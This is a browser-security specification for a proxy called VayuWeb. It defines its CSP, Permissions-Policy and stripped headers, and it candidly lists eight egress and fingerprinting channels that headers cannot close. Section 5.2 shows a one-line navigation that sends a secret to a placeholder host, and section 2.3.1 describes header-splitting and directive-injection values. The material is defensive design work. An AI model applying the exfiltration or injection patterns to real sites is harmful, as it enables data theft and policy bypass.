# VayuWeb Content Security Specification

The normative browser-security profile the VayuWeb resolver enforces on every page it serves: the
Content-Security-Policy, the accompanying response headers, the request headers stripped on the
way out, the response headers stripped on the way in, and — just as important — the **eight**
channels no header can close, with what closes each one, what merely narrows it, and what is not
claimed at all.

That last clause used to read "and what closes them instead", which is not true of section 5 and
was never meant to be: 5.7 says "Not closable, and not claimed" and 5.8 says "Complete and
irreducible" in the document's own words. A summary line that promises more than the section
below it delivers is the exact failure section 5 opens by naming.

This document is the **single source of truth** for those values. Where any other document quotes
them, `scripts/check-headers.py` verifies the quotation is byte-identical and CI fails on
divergence. A profile that drifts between documents is worse than no profile: two implementers
read two different policies and both believe they conform.

The key words MUST, MUST NOT, SHALL, SHALL NOT, SHOULD, SHOULD NOT and MAY are to be interpreted
as described in RFC 2119.

**Status:** Draft, partially implemented. Proposed formally by [VWIP-0001](VWIP-0001.md).
The header set and the per-name origin isolation are in `registry/src/proxy.ts`; content
fetching and the browser integration are not. Draft means every value here is open to
revision by VWIP, not that nothing enforces them — that phrasing outlived its truth once and
`scripts/check-status-claims.py` now refuses it.

## 0. The governing principle

> **Entropy only matters if it can leave.**

A reader's browser is a fingerprint no header can erase. Canvas rasterisation, audio DSP paths,
font metrics and `navigator` properties are all readable, and CSP has nothing to say about any of
them. Chasing that entropy is close to unwinnable.

What *is* winnable is starving the exfiltration channel. If a page cannot make a request to
anyone but its own origin, cannot navigate away with a payload, and cannot cause the browser to
speculatively resolve a hostname, then a perfect fingerprint is worth nothing because it cannot be
delivered.

This inverts the usual priority order, and two consequences follow:

1. Effort goes to **egress closure** first and fingerprint reduction second.
2. **Any** relaxation that restores an outbound channel — a cross-name subresource allowance, a
   clearnet passthrough, a partially proxied browser — instantly revalues every unfixable
   fingerprinting vector from harmless to critical. That is why the refusals in this document are
   not tunable.

A second principle governs the values VayuWeb does control:

> **Uniform beats random.** A spoofed value helps only if every install emits the same one. A
> per-user "randomise my fingerprint" toggle *shrinks* the anonymity set by making its user
> unique. VayuWeb therefore pins shared constants — one User-Agent, one window size, `TZ=UTC`, one
> `Accept-Language` — and offers no randomisation setting at all.

## 1. The insecure-context reality

**VayuWeb pages are served from origins like `http://example.vayu`, which are not secure contexts.**
Loopback is treated as potentially trustworthy, but the *origin the browser derives* is the VayuWeb
name over plain HTTP, and that is not.

This is the single most consequential fact about this profile, it cuts both ways, and every
implementer must understand it before reading anything below.

**What is INERT and MUST NOT be relied upon:**

| Header | Reality on an insecure origin |
|---|---|
| `Cross-Origin-Opener-Policy` | Ignored. `window.name` therefore **survives cross-name navigation** and is a live cross-origin correlation channel. |
| `Cross-Origin-Embedder-Policy` | Ignored. No cross-origin isolation — which is incidentally desirable here, since isolation would grant `SharedArrayBuffer` and high-resolution timers, sharpening timing attacks. |
| `Origin-Agent-Cluster` | Ignored. |
| `Clear-Site-Data` | **Ignored on insecure origins.** Any design that relies on it to clear storage is relying on nothing. |

`window.name` deserves its own line rather than a footnote to COOP. Because COOP is inert, it
**survives navigation between VayuWeb names** and is a live cross-name correlation channel that no
header closes. The owner of that problem is the client: the webview MUST set `window.name = ''`
on every cross-name navigation, and the conformance suite asserts it (section 6, test 9).

These headers are still sent, because they cost nothing and become active if VayuWeb ever gains a
secure-context scheme. They MUST NOT appear in any claim about what the profile currently
guarantees.

**What the insecure context protects for free:**

- **Service workers cannot register at all.** The largest persistence and background-exfiltration
  surface in the platform is structurally unavailable.
- `navigator.mediaDevices` is `undefined`, closing device enumeration.
- `queryLocalFonts`, `getScreenDetails`, WebUSB, WebHID, Web Serial, Web Bluetooth, geolocation
  and the storage-access API are all secure-context gated and therefore unavailable.

This accidental protection is load-bearing. It follows that **VayuWeb MUST NOT register a custom
scheme as trustworthy, MUST NOT ship a browser policy that adds VayuWeb origins to a
treat-as-secure allowlist, and MUST NOT serve VayuWeb names over HTTPS from the local proxy.** Doing
any of those would re-enable service workers and the whole secure-context API surface in a single
step. Article 4's no-chokepoint invariant is not the only invariant worth writing down.

Because `Clear-Site-Data` is inert, storage clearing is achieved the only way it can be: an
**ephemeral browser profile directory**, created per session and destroyed after. See
[PRIVACY.md](PRIVACY.md).

## 2. Content-Security-Policy

The resolver SHALL inject this header on every response it serves, **replacing** any policy the
site supplied. A site-supplied CSP is discarded rather than merged, because merging two policies
is a well-known source of accidental widening. It is injected on non-HTML responses too, so that
a worker or worklet script inherits it.

<!-- canonical:content-security-policy -->
```text
Content-Security-Policy: default-src 'none'; script-src 'self'; style-src 'self'; img-src 'self'; font-src 'self'; media-src 'self'; connect-src 'self'; manifest-src 'self'; worker-src 'none'; child-src 'none'; frame-src 'none'; object-src 'none'; frame-ancestors 'none'; form-action 'self'; base-uri 'none'; webrtc 'block'; require-trusted-types-for 'script'; trusted-types 'none'
```

### 2.1 Directive rationale

| Directive | Value | Why |
|---|---|---|
| `default-src` | `'none'` | Fail closed. A resource type nobody remembered to enumerate — including types added to the platform after this was written — inherits a denial, not a permission. |
| `script-src` | `'self'` | No `'unsafe-inline'`, no `'unsafe-eval'`, and deliberately no `'wasm-unsafe-eval'`. Also governs worklet `addModule()` and `type="speculationrules"` blocks. |
| `style-src` | `'self'` | No `'unsafe-inline'`. Inline CSS is a working exfiltration channel — an attribute selector plus a `url()` leaks document content character by character — and is the relaxation that most often drags script injection back through `style` attributes. |
| `img-src` | `'self'` | Not `data:`. Attacker-controlled bytes rendered without a fetch, for no benefit: every asset is already inside the page's own CID. |
| `font-src` | `'self'` | Closes `@font-face` and the `unicode-range` probe. |
| `media-src` | `'self'` | Covers `video`, `audio`, `source` and `track`. `blob:` excluded — a blob can be built from data obtained elsewhere. |
| `connect-src` | `'self'` | `fetch`, `XMLHttpRequest`, `WebSocket`, `EventSource`, `sendBeacon`, `fetchLater`, WebTransport and the anchor `ping` attribute. The most important directive here. |
| `manifest-src` | `'self'` | Manifest icons then fall to `img-src`. |
| `worker-src` | `'none'` | **Not `'self'`.** `worker-src` gates `serviceWorker.register()` as well as `Worker` and `SharedWorker`. `'self'` would permit registration — and with it Cache Storage, Background Sync and Push, none of which has a Permissions-Policy token. Service workers are already unavailable per section 1; this makes the denial explicit rather than dependent on that. |
| `child-src` | `'none'` | Fallback for nested contexts in older engines. |
| `frame-src` | `'none'` | No iframes. Note `about:blank` and `srcdoc` frames are exempt from this directive in shipping browsers, but they inherit the parent's policy, so nothing escapes. |
| `object-src` | `'none'` | Legacy execution surface, no legitimate use. |
| `frame-ancestors` | `'none'` | Removes clickjacking and cross-origin framing side channels. |
| `form-action` | `'self'` | **Not `'none'`.** `'none'` breaks any VayuWeb site with a search box while closing nothing extra — third-party form exfiltration is already blocked by restricting the value to `'self'`. Enforced across redirects. |
| `base-uri` | `'none'` | Stops an injected `<base>` re-pointing every relative URL. |
| `webrtc` | `'block'` | CSP Level 3. Blocks `RTCPeerConnection` construction. **Chromium-only at present** — see section 5.1, this is a partial control, not a solved problem. |
| `require-trusted-types-for` | `'script'` | Closes DOM-XSS sinks at the platform level rather than by code review. |
| `trusted-types` | `'none'` | No policy may be created, so the sinks are unreachable rather than merely guarded. Cost and relaxation in 2.3. |

### 2.1a Engine support is not uniform

Three of the directives above are not implemented everywhere, and a profile that implies
otherwise is misleading:

| Directive | Reality |
|---|---|
| `webrtc 'block'` | **Chromium only.** Elsewhere it is ignored entirely and section 5.1 is the whole defence. |
| `require-trusted-types-for` / `trusted-types` | Chromium and recent Firefox. WebKit does not enforce, and does so **silently** — an author testing only in Safari will believe their page is protected when it is not. |
| `worker-src` | Widely supported, but engines differ on whether it or `script-src` governs worklets. Both are `'self'` or stricter here, so the ambiguity cannot open a hole. |

The profile is therefore **strongest in the VayuWeb client's own webview**, where the engine is
known and the client controls it. In a third-party browser the guarantees are engine-conditional,
and the client MUST say which ones are not in force rather than presenting one uniform claim.

### 2.2 Directives deliberately absent

- **`upgrade-insecure-requests`** — meaningless over loopback HTTP, and would break same-origin
  subresources.
- **`block-all-mixed-content`** — deprecated, subsumed by `'self'`-only sources.
- **`report-uri` / `report-to`** — refused on principle. A reporting endpoint is an outbound
  channel that fires precisely when something unexpected happens, making it both a leak and an
  oracle. A *local* report endpoint is no better: it would become a durable log of every URL any
  page attempted, which is exactly the artefact [PRIVACY.md](PRIVACY.md) exists to prevent.
- **`sandbox`** — considered and rejected, but not for the obvious reason. Omitting
  `allow-top-navigation` is the *only* CSP lever over navigation exfiltration (section 5.2), which
  is a real argument for it. It is rejected because it would also block ordinary user-clicked
  links between VayuWeb names, breaking the web-like behaviour the project exists to preserve, and
  because the full-proxy requirement closes the same channel without that cost. If the full-proxy
  requirement is ever relaxed, `sandbox` MUST be reconsidered in the same change.

### 2.3 What this breaks, and the two relaxations

| Breaks | Relaxation |
|---|---|
| Inline `<style>`, `style=` attributes | None. Move to a stylesheet in the same CID. |
| Inline `<script>`, event-handler attributes | None. Move to a script file in the same CID. |
| WebAssembly | Per-site `vayu-wasm` declaration adds `'wasm-unsafe-eval'` **for that site only**, surfaced in the UI. |
| Frameworks writing HTML strings to the DOM | Per-site named Trusted Types policy, same scoping and disclosure. |
| `data:` images, inline SVG sprites | None. Must become files. |
| Web Workers | None in v1. `worker-src 'none'` is absolute; revisit only by VWIP. |

Every relaxation is **per-site, never global**, and **visible to the reader**. A widening the
reader cannot see is a widening that will be abused. No configuration file, control-API setting or
command-line flag may apply either relaxation globally, and that refusal is not tunable.

#### 2.3.1 The Trusted Types policy name is a constrained value

The policy name comes out of the site's own `.vayu/manifest.json` and is spliced into the
`trusted-types` directive of a header the resolver emits. It is therefore publisher-controlled
input reaching a security header, and it MUST be constrained here rather than left to each
implementer.

`csp.trustedTypes` MUST match the CSP `tt-policy-name` production —
`[A-Za-z0-9\-#=_/@.%]{1,64}` — and MUST NOT be `*` and MUST NOT be `'allow-duplicates'`. It MUST
be validated **before the header is constructed**. A manifest failing the check is served under
the canonical `trusted-types 'none'`: **refused, not repaired**, matching the discipline
[LOCAL-SURFACE.md](LOCAL-SURFACE.md) 3.2 applies to a malformed label.

None of this was stated anywhere. The row above said "Per-site named Trusted Types policy, same
scoping and disclosure" and [PUBLISHING.md](PUBLISHING.md) 2.2 wrote the field as
`csp.trustedTypes: "<policy-name>"` — a token appearing exactly once in the entire corpus, with
no character set, no length and no forbidden values. The publisher, not the resolver, decided what
text landed in the header:

- `*` yields `trusted-types *`, which is unrestricted policy creation rather than one named
  policy — a materially larger widening than this table authorises, obtained without a VWIP.
- A value containing `;` appends arbitrary directives to the emitted policy.
- A value containing CR or LF splits the response header outright.

Each defeats "No configuration file … may apply either relaxation globally, and that refusal is
not tunable" three paragraphs above, and each is invisible to the reader-facing disclosure, which
announces a named Trusted Types policy whatever the name actually did.

The corpus already held the governing rule for the only other externally-supplied value that
reaches a header — LOCAL-SURFACE.md 3.1, validated "**before** it is echoed, cached, logged, used
to construct any header" — and had simply never extended it to the manifest. That is the whole
defect: not a missing idea, a missing application of one already written down.

**The list is closed here and nowhere else.** A relaxation not in this table does not exist,
whichever document proposes it. `PUBLISHING.md` section 2.1 previously defined a third — per-site
`'sha256-…'` expressions for manifest-declared inline elements — and additionally said the reader
indicator "MUST NOT change", against the sentence above. It is withdrawn there; the argument for
it is kept, because it was a good argument, and adding it here needs a VWIP rather than a
subordinate document's paragraph. Anything that adds to this table must also update the count in
RESOLUTION.md, VWIP-0001 and PUBLISHING.md, which `scripts/check-counts.py` now holds together.

## 3. Accompanying response headers

<!-- canonical:permissions-policy -->
```text
Permissions-Policy: accelerometer=(), ambient-light-sensor=(), attribution-reporting=(), autoplay=(), battery=(), bluetooth=(), browsing-topics=(), camera=(), clipboard-read=(), clipboard-write=(), compute-pressure=(), display-capture=(), encrypted-media=(), fullscreen=(), gamepad=(), geolocation=(), gyroscope=(), hid=(), identity-credentials-get=(), idle-detection=(), join-ad-interest-group=(), language-detector=(), local-fonts=(), magnetometer=(), microphone=(), midi=(), otp-credentials=(), payment=(), picture-in-picture=(), private-state-token-issuance=(), private-state-token-redemption=(), publickey-credentials-create=(), publickey-credentials-get=(), run-ad-auction=(), screen-wake-lock=(), serial=(), shared-storage=(), shared-storage-select-url=(), speaker-selection=(), storage-access=(), summarizer=(), translator=(), usb=(), web-share=(), window-management=(), xr-spatial-tracking=()
```

Every feature carries the **empty allowlist**, denying it to the document and every nested
context. The list is a literal enumeration rather than a description, because "deny every powerful
feature" is not something an implementation can execute or a test can check.

Four groups deserve note:

- **Privacy Sandbox / ad-tech** — `attribution-reporting`, `browsing-topics`,
  `join-ad-interest-group`, `run-ad-auction`, `shared-storage`, `shared-storage-select-url`,
  `private-state-token-*`. These bypass CSP entirely by design; Permissions-Policy is the only
  lever over them.
- **On-device model APIs** — `translator`, `summarizer`, `language-detector`. Newer, and each is
  a potential egress or side channel.
- **`local-fonts`** — one of the highest-entropy fingerprinting surfaces available.
- **`window-management`** — closes `getScreenDetails` and `screen.isExtended`.

This list MUST be treated as a floor and reviewed against each browser release. A feature not
named here SHOULD be denied, and an omission is a defect to report. Note also that **no
Permissions-Policy token exists** for notifications, push, canvas, WebGL, Web Audio or the
Network Information API — those are covered, where they can be, in section 5.

`clipboard-read` and `clipboard-write` were in that sentence, and both are real tokens in the
W3C permissions-policy feature registry. So the document reported an omission as an impossibility
— which is the one way a floor rule can fail silently, because "a feature not named here SHOULD
be denied" only produces an action if someone believes a token exists to deny it with. Both are
now in the header, and a clipboard read is a page reading whatever the reader last copied, which
on a machine where somebody is handling keys is not a small thing.

<!-- canonical:referrer-policy -->
```text
Referrer-Policy: no-referrer
```

No referrer in any direction, including same-origin, so a page cannot learn which page linked to
it even within one site. Note that `<meta name="referrer" content="unsafe-url">` **overrides this
header per specification**, so the resolver MUST also strip `Referer` on the request side rather
than trusting the policy alone. Defence in depth here is not optional; it is correctness.

| Header | Value | Purpose |
|---|---|---|
| `X-Content-Type-Options` | `nosniff` | No MIME sniffing; a misdeclared type is an error, not a guess. |
| `X-Frame-Options` | `DENY` | Redundant beside `frame-ancestors 'none'` on modern engines; retained for older ones. |
| `X-DNS-Prefetch-Control` | `off` | Speculative DNS is **not covered by CSP**. Without this, `<link rel="dns-prefetch">` produces a clearnet DNS query — exactly the leak VayuWeb exists to prevent. Note it does not stop `preconnect`'s TCP handshake in all versions; section 4.3 strips the markup as well. |
| `Cache-Control` | `no-store` | **Removes the HTTP disk cache only.** It does not reach the media cache, the favicon database or the thumbnail store, each of which is a separate artefact closed only by the ephemeral profile in [PRIVACY.md](PRIVACY.md). It also forfeits the offline benefit of content addressing — a genuine trade, made in favour of leaving no trail. |
| `Cross-Origin-Opener-Policy` | `same-origin` | **Inert today** (section 1). Sent for the future. |
| `Cross-Origin-Embedder-Policy` | `require-corp` | **Inert today.** Its inertness is fortunate: activation would grant `SharedArrayBuffer` and high-resolution timers. |
| `Cross-Origin-Resource-Policy` | `same-origin` | Active regardless of secure context. Blocks cross-origin size and timing probes against VayuWeb content. |
| `Origin-Agent-Cluster` | `?1` | **Inert today.** Sent for the future. |

## 4. Header and markup hygiene at the proxy

### 4.1 Request headers the resolver MUST NOT emit

The rule is not "strip identifying headers" but the stronger, testable property:

> **Every install emits a byte-identical outbound request header set.**

Never forwarded or generated: `Referer`, `Cookie`, `Authorization`, `Sec-CH-UA` and every other
Client Hint (`-Mobile`, `-Platform`, `-Platform-Version`, `-Arch`, `-Bitness`, `-Model`,
`-Full-Version`, `-Full-Version-List`, `-WoW64`, `-Form-Factors`, `-Prefers-*`), `Downlink`,
`ECT`, `RTT`, `Save-Data`, `DNT`, `Sec-GPC`, `X-Forwarded-For`, `X-Real-IP`, `Via`, `Forwarded`,
and anything carrying an install identifier, resolver version, build hash or platform string.

Pinned to shared constants: `User-Agent` (one fixed, version-free value for every install),
`Accept-Language` (`en`, regardless of system locale).

### 4.2 Response headers the resolver MUST strip

`Set-Cookie`, `Set-Cookie2`; any `Content-Security-Policy` or
`Content-Security-Policy-Report-Only` the content supplied; `Report-To`, `Reporting-Endpoints`,
`NEL`; `Server-Timing`; `Link` (carries `preconnect`, `preload` and `dns-prefetch` relationships
that bypass CSP); `Refresh`; `Alt-Svc`; `Accept-CH` and `Critical-CH`; `Strict-Transport-Security`;
`Public-Key-Pins`; `Access-Control-Allow-*`; `Timing-Allow-Origin`; `Server`.

### 4.3 Markup the resolver MUST neutralise

Not covered by CSP, and therefore removed before serving:

- `<link>` with `rel` of `dns-prefetch`, `preconnect`, `prefetch`, `prerender` or `modulepreload`
  where the href is not same-origin.
- `<script type="speculationrules">` blocks and any `Speculation-Rules` header.
- `<meta http-equiv="refresh">` with a non-same-origin target.
- `<meta name="referrer">` in any form — it overrides the header per specification.
- The `ping` attribute on anchors. Covered by `connect-src` in current engines; removed anyway so
  that coverage is not a dependency.

Rewriting markup conflicts with byte-exact CID verification. The resolver MUST therefore verify
the content hash **before** neutralisation, serve the modified bytes, and expose the original
verified hash through the control API so the reader can confirm what was fetched.

## 5. What no header can close

A security document that lists only its wins is a marketing document.

Eight channels, and they are not all of a kind. **5.2** and **5.3** are closed by a control this
project ships. **5.1**, **5.4**, **5.5** and **5.6** are narrowed by a control that works in the
client's own webview and cannot be enforced in a third-party browser, where the honest answer is
a plain warning. **5.7** and **5.8** are neither closed nor narrowed, and saying so is the point:
`VWIP-0001` once summarised this section as "the four channels CSP cannot close and what closes
them instead", which understated the count by half and overstated the remedy for six of them.

**5.1 WebRTC.** `webrtc 'block'` is Chromium-only. Where unsupported, a page that can run script
can open a peer connection and learn the reader's real IP through ICE gathering. WebRTC uses raw
UDP and **ignores the HTTP proxy entirely**, so full-proxy mode does not contain it either.

*Control:* the VayuWeb desktop client MUST ship with WebRTC compiled out or disabled in its webview.
For a third-party browser the resolver cannot enforce it, and the client MUST warn plainly rather
than imply protection it does not have. This is the most serious residual in the browser layer.

**5.2 Top-level navigation.** `navigate-to` never shipped; `form-action` covers only forms.
`location = 'https://example.invalid/?' + secret` works.

*Control:* full-proxy configuration, so the navigation becomes a request the resolver refuses with
`1403 EGRESS_REFUSED`. This is why Private Mode requires whole-browser proxying rather than an
extension — an extension cannot guarantee it sees every navigation, and a partially proxied
browser is a browser with a hole in it.

**5.3 The PAC file.** The proxy auto-config that routes the browser is itself a leak surface. It
MUST match on strings only — `dnsDomainIs`, `shExpMatch`, host-suffix comparison — and MUST NOT
call `dnsResolve`, `isResolvable`, `isInNet` or `myIpAddress`, every one of which performs a DNS
lookup or network probe while deciding how to route. It MUST NOT contain a `DIRECT` fallback for
VayuWeb names.

**5.4 Fingerprinting the platform cannot gate.** Canvas, WebGL, Web Audio DSP, font metrics via
`getBoundingClientRect`, `navigator` core properties, `devicePixelRatio`, `colorDepth`, the CSS
media-feature set, timezone and ICU version. No CSP directive and no Permissions-Policy token
exists for any of them.

*Control:* client-side only — a fixed launch window size, `TZ=UTC` in the client environment,
WebGL and Web Audio disabled in the client's webview. And, per section 0, these matter only if
egress is open; the primary defence is that the fingerprint has nowhere to go.

**5.5 The browser's own behaviour.** Omnibox search suggestions, Safe Browsing lookups,
translation offers, update checks and **extensions** — every one is a clearnet request the
resolver never sees, and an extension can read every VayuWeb page with CSP and proxy both intact.

*Control:* Private Mode requires the client's own webview or a locked browser profile with
telemetry, suggestions and extensions disabled. With a third-party browser this cannot be
enforced, and the client MUST say so.

**5.6 Network-layer correlation.** DHT and bitswap traffic reveal which blocks a reader wants. A
pinning service that is the sole provider of a site sees every one of its readers.

*Control:* rotate the PeerID per session and per Private Mode launch; prefer locally pinned blocks
and already-connected peers; fetch and verify the **entire site DAG atomically** on first request
and serve every subsequent path from that snapshot, so that path-level block selection cannot be
used as an exfiltration oracle. Volume and timing still correlate, and that is not closable.

**5.7 Same-origin timing.** Which page of a site a reader opened. Not closable, and not claimed.

**5.8 A compromised endpoint.** Complete and irreducible.

## 6. Conformance

Each is an executable test asserting on **observed behaviour**, not configuration:

1. The three canonical values in sections 2 and 3 are emitted byte-identically on every response,
   **absent an enumerated 2.3 relaxation**, and any response that differs from them differs by
   exactly one of those relaxations and by nothing else. The qualifier is not a loophole, it is
   the repair of one: stated unqualified, this test contradicted 2.3, which permits two per-site
   widenings and therefore two policies that are not byte-identical to the canonical one. An
   implementer reading only this line would have concluded the relaxations could not be emitted
   at all; one reading only 2.3 would have concluded the policy may vary freely. The test is what
   distinguishes a policy that varies by an enumerated, disclosed relaxation from one that varies
   because something appended to it.
2. A site-supplied CSP is discarded, never merged.
3. **Zero-egress, in the client webview.** Load a page containing one of every construct in
   section 4.3 under a socket monitor scoped to the whole network namespace, not to the browser
   process. The observed connection set contains only VayuWeb peers. Any other socket **fails the
   build**.
4. **Zero-egress, third-party browser matrix.** The same test across Firefox, Chromium and WebKit.
   Run for **disclosure**, recorded and published — and it MUST NOT gate the build, because VayuWeb
   does not control those engines and a test that can be broken by someone else's release is not
   a gate, it is a tripwire. Pretending otherwise would make the suite dishonest.
5. Two installs on different machines emit byte-identical outbound request headers.
6. Every relaxation in 2.3 is per-site and surfaced in the UI.
7. `serviceWorker.register()` rejects.
8. The PAC file contains none of the forbidden functions (static check).
9. `window.name` is empty after a navigation between two VayuWeb names.
10. The whole-DAG snapshot is fetched and verified before any path is served, and a record whose
    only entry is `peer` returns 1421 rather than being fetched — a live peer source would
    otherwise reintroduce the path-selection oracle that 5.6 exists to close.

    This item used to say a `peer` record "is refused as a content source unless it can be
    snapshot-verified". That was the only sentence in the corpus refusing it, it sat in a list of
    conformance *tests* rather than in the resolution algorithm, and "snapshot-verified" appeared
    exactly once in the whole repository and was defined nowhere. [RESOLUTION.md](RESOLUTION.md)
    now makes `peer` a transport hint rather than a source, in the document a resolver is built
    from, so this item tests a rule that exists instead of naming a term that did not.

Test 3 is the one that matters, and test 4 is the one that keeps test 3 honest. Constitution
Article 14 requires this form of test, and Article 44.8 places it in the same conformance run as
the wire vectors, so a rights guarantee and a correctness guarantee fail the same build.

## See also

- [Privacy and zero-trail specification](PRIVACY.md)
- [Resolution specification](RESOLUTION.md)
- [VWIP-0001](VWIP-0001.md)
- [Threat model](../THREAT-MODEL.md)
- [The VayuWeb Constitution](../../constitution/CONSTITUTION.md) — Articles 13, 14, 24
